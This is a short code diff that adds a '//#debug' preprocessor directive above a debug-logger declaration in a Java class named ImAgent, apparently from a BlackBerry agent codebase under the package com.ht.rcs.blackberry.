@@ -4,6 +4,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class ImAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
 
     private int timeToSleep = 1000;
